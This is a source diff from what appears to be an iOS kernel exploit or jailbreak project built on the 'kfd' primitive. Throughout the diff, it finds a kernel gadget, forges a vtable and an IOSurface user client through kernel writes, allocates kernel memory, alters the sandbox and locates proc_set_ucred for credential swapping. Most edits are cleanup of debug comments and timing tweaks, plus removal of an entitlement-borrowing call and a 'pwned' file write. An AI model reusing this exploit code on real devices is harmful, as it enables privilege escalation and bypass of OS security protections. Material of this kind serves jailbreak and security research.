@@ -192,35 +192,19 @@ uint64_t fake_vtable;
 uint64_t fake_client;
 mach_port_t user_client;
 
-uint64_t init_kcallKRW(void) {                       //18446744004791735336
-   // uint64_t add_x0_x0_0x40_ret_func1 = add_x0_x0_0x40_ret_func - get_kslide();
-    //b4 add_x0_x0_0x40_ret_func    uint64_t    18446744005297201332.     18446744005083504820
-   // uint64_t add_x0_x0_0x40_ret_func2 = getOffset(0);//18446744005083504820
-                                //    , before slide = 18446744005378351284
+uint64_t init_kcallKRW(void) {
     struct kfd* kfd_struct = (struct kfd*)FINAL_KFD;
     uint64_t add_x0_x0_0x40_ret_func = 0;
     init_kernel(kfd_struct);
     add_x0_x0_0x40_ret_func = getOffset(0);
     if (add_x0_x0_0x40_ret_func == 0) {
-      //  util_printf("[-] add_x0_x0_0x40_ret_func not in cache, patchfinding\n");
         add_x0_x0_0x40_ret_func = find_add_x0_x0_0x40_ret(kfd_struct);
-        //off_add_x0_x0_0x40_ret = add_x0_x0_0x40_ret_func;
         off_add_x0_x0_0x40_ret = add_x0_x0_0x40_ret_func - kfd_struct->info.kernel.kernel_slide;
-       // util_printf("off_add_x0_x0_0x40_ret @ 0x%llx\n", off_add_x0_x0_0x40_ret);
-       // util_printf("off_add_x0_x0_0x40_ret - slide @ 0x%llx\n", off_add_x0_x0_0x40_ret);
-
         setOffset(0, add_x0_x0_0x40_ret_func - kfd_struct->info.kernel.kernel_slide);
     } else {
-       // util_printf("[+] add_x0_x0_0x40_ret_func in cache\n");
         add_x0_x0_0x40_ret_func += kfd_struct->info.kernel.kernel_slide;
-        //off_add_x0_x0_0x40_ret = add_x0_x0_0x40_ret_func;
         off_add_x0_x0_0x40_ret = add_x0_x0_0x40_ret_func - kfd_struct->info.kernel.kernel_slide;
-      //  util_printf("off_add_x0_x0_0x40_ret @ 0x%llx\n", off_add_x0_x0_0x40_ret);
-     //   util_printf("off_add_x0_x0_0x40_ret - slide @ 0x%llx\n", off_add_x0_x0_0x40_ret);
     }
-   // util_printf("add_x0_x0_0x40_ret_func @ 0x%llx\n", add_x0_x0_0x40_ret_func);
-   // util_printf("off_add_x0_x0_0x40_ret @ 0x%llx\n", off_add_x0_x0_0x40_ret);
-
     io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
     if (service == IO_OBJECT_NULL){
         printf(" [-] unable to find service\n");
@@ -250,9 +234,7 @@ uint64_t init_kcallKRW(void) {                       //18446744004791735336
     }
     kwrite64(_fake_client, _fake_vtable);
     kwrite64(uc_port + off_ipc_port_ip_kobject, _fake_client);
-    kwrite64(_fake_vtable+8*0xB8, add_x0_x0_0x40_ret_func);//add_x0_x0_0x40_ret_func2);
-//    kwrite64(_fake_vtable+8*0xB8, add_x0_x0_0x40_ret_func1);
-
+    kwrite64(_fake_vtable+8*0xB8, add_x0_x0_0x40_ret_func);
     return 0;
 }
 
@@ -317,7 +299,7 @@ int kalloc_using_empty_kdata_page(void) {
     allocated_kmem[1] = kalloc(FINAL_KFD, 0x1000);
     IOServiceClose(_user_client);
     _user_client = 0;
-    usleep(2000);
+    usleep(1000);
     clean_dirty_kalloc(_fake_vtable, 0x1000);
     clean_dirty_kalloc(_fake_client, 0x1000);
     _fake_vtable = allocated_kmem[0];
@@ -344,7 +326,7 @@ int kalloc_using_empty_kdata_page152(void) {
     allocated_kmem[1] = kalloc(FINAL_KFD, 0x1000);
     IOServiceClose(_user_client);
     _user_client = 0;
-    usleep(500);
+    usleep(1000);
     clean_dirty_kalloc(_fake_vtable, 0x1000);
     clean_dirty_kalloc(_fake_client, 0x1000);
     _fake_vtable = allocated_kmem[0];
@@ -395,9 +377,8 @@ int prepare_kcall(void) {
            // sandbox(getpid(), sb);
             bool didweboxit = sandbox(getpid(), sb);
            // printf("Sandboxed? = %i\n", didweboxit);
-            usleep(1000);
-            uint64_t procAmfipid = proc_of_pidAMFI(getpid());
-            borrow_entitlements(getpid(), 1);
+            //usleep(1000);
+            //uint64_t procAmfipid = proc_of_pidAMFI(getpid());
             
            // printf("Saved fake_vtable: 0x%llx, fake_client: 0x%llx\n", fake_vtable, fake_client);
            // init_kcall2(FINAL_KFD);
@@ -415,8 +396,6 @@ int prepare_kcall(void) {
             };
             BOOL success = [dictionary writeToFile:save_path atomically:YES];
             if (!success) { printf("[-] Failed createPlistAtPath: /tmp/kfd-arm64.plist\n"); return -1; }
-            BOOL successwritetovar = [dictionary writeToFile:@"/var/mobile/test_pwned4evr.txt" atomically:YES];
-            if (!successwritetovar) { printf("[-] Failed createtxtAtPath: /var/mobile/test_pwned4evr.txt\n"); return -1; }
             bool didweboxit = sandbox(getpid(), sb);
             //printf("Sandboxed? = %d\n", didweboxit);
             //printf("Saved fake_vtable: 0x%llx, fake_client: 0x%llx\n", _fake_vtable, _fake_client);
@@ -461,25 +440,14 @@ uint64_t gogroo(uint64_t proc_addr)
 void stage22(u64 kfd)
 {
     struct kfd* kfd_struct = (struct kfd*)kfd;
-    //util_printf("patchfinding!\n");
     init_kernel(kfd_struct);
-    
-    //add_x0_x0_0x40_ret_func = getOffset(0);
     if (add_x0_x0_0x40_ret_func == 0) {
-    //    util_printf("[-] add_x0_x0_0x40_ret_func not in cache, patchfinding\n");
         add_x0_x0_0x40_ret_func = find_add_x0_x0_0x40_ret(kfd_struct); //18446744005378351284
         setOffset(0, add_x0_x0_0x40_ret_func - kfd_struct->info.kernel.kernel_slide);
     } else {
-   //     util_printf("[+] add_x0_x0_0x40_ret_func in cache\n");
         add_x0_x0_0x40_ret_func += kfd_struct->info.kernel.kernel_slide;
     }
-    //util_printf("add_x0_x0_0x40_ret_func @ 0x%llx\n", add_x0_x0_0x40_ret_func);
-    //util_printf("slide @ 0x%llx", kfd_struct->info.kernel.kernel_slide);
-
-    //proc_set_ucred_func = getOffset(1);
     if (proc_set_ucred_func == 0) {
-     //   util_printf("[-] proc_set_ucred_func not in cache, patchfinding\n");
-        
         proc_set_ucred_func = find_proc_set_ucred_function(kfd_struct);//18446744005408493912
         setOffset(1, proc_set_ucred_func - kfd_struct->info.kernel.kernel_slide);
     } else {
